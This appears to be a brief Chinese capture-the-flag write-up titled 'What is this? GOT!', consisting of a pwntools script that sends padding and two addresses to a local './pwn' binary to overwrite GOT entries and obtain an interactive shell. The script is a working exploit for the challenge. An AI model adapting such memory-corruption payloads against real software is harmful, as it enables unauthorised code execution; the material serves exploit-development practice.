# 这是什么？GOT！

```py
#注意不要扰乱原本system的got，其他随意
from pwn import *
p=process("./pwn")
p.sendlineafter("ts`.\n",b'a'*16+p64(0x401056)+b'a'*32+p64(0x401196))
p.interactive()
```